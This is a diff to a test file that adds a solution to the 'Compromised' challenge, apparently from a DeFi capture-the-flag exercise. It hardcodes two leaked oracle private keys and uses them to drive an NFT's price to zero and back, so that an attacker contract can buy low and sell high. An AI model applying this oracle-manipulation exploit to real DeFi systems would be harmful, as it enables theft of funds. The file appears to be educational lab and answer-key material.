@@ -75,6 +75,51 @@ describe('Compromised challenge', function () {
 
   it('Exploit', async function () {
     /** CODE YOUR EXPLOIT HERE */
+    // These are the compromised private keys that were decoded from the web service output
+    const KEY1 =
+      '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+    const KEY2 =
+      '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+    const signer1 = new ethers.Wallet(KEY1, ethers.provider);
+    const signer2 = new ethers.Wallet(KEY2, ethers.provider);
+    const oracleSigners = [signer1, signer2];
+
+    const symbol = await this.nftToken.symbol();
+
+    const CompromisedAttackerFactory = await ethers.getContractFactory(
+      'CompromisedAttacker',
+      attacker
+    );
+    const compromisedAttacker = await CompromisedAttackerFactory.deploy();
+
+    // manipulate the price oracle low
+    await Promise.all(
+      oracleSigners.map(async (each) =>
+        (await this.oracle.connect(each).postPrice(symbol, 0)).wait()
+      )
+    );
+
+    await (
+      await compromisedAttacker
+        .connect(attacker)
+        .attackSetup(this.exchange.address, 10, 1, false, { value: 10 })
+    ).wait();
+
+    // restore price oracle
+    await Promise.all(
+      oracleSigners.map(async (each) =>
+        (
+          await this.oracle.connect(each).postPrice(symbol, INITIAL_NFT_PRICE)
+        ).wait()
+      )
+    );
+
+    // sell the NFTs :)
+    await (
+      await compromisedAttacker
+        .connect(attacker)
+        .attackFinish(this.exchange.address, 0)
+    ).wait();
   });
 
   after(async function () {
